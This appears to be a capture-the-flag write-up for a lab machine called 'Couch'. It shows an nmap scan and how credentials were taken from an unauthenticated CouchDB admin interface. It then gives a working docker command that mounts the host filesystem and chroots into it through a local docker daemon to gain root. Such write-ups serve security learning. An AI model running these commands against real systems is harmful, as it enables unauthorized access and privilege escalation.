# Couch

## Enumeration

```
# Nmap 7.91 scan initiated Tue Jul  6 11:02:39 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,5984 10.10.196.59
Nmap scan report for 10.10.196.59
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-07-06 11:02:40 PDT for 17s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
|   256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
5984/tcp open  http    syn-ack ttl 61 CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 11:02:57 2021 -- 1 IP address (1 host up) scanned in 18.19 seconds
```

SSH on port 22 and a DB endpoint called CouchDB on port 5984. Lets check out CouchDB and see what we can find.

## CouchDB Port 5984

Looking at the documentation for CouchDB we can use an administration tool located at http://server.ip:5984/_utils/. We are immediately presented a list of databases. The database title secret stands out and sure enough if we examine its content we find a field passwordbackup with credentials that work on SSH so lets move on to the actual machine and see what we can find.

## Initial Foothold/Privilege Escalation

We can find the user.txt flag in the home directory we are placed in. We don't have sudo permissions however our .bash_history has not been cleared and we see the following line of interest

```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Looks like docker is running locally with elevated privileges, so lets use a common privilege escalation method to try and get root privileges
```
docker run -it -v /:/host/ alpine chroot /host/ bash
```

Unfortunately we get permission denied because we cannot connect to the socket. It is running locally on port 2375 so we likely need to specify the host address so we modify the command as follows
```
docker -H 127.0.0.1:2375 run -it -v /:/host/ alpine chroot /host/ bash

```

Sure enough this works and we have root and can find the root.txt flag in /root
